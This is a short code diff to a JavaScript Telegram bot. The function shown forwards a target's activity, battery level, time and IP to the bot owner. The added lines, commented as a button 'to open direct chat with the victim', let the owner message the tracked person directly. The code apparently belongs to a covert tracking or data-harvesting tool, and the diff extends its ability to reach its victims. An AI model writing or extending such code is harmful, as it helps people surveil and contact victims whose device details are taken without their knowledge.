@@ -168,10 +168,14 @@ async function _flushBuf(tid, ip) {
   if (p.activity) premMsg += `🚶 نشاط: ${p.activity}\n`;
   if (p.battery)  premMsg += `${p.battery}\n`;
   premMsg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
+  // Button to open direct chat with the victim
+  const chatKb = JSON.stringify({ inline_keyboard:[[
+    { text: "💬 راسله على تيليغرام", url: `tg://user?id=${tid}` }
+  ]]});
   if (Number(tid) === BOT_OWNER) {
-    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
+    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
   } else {
-    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
+    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
     bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
   }
 }
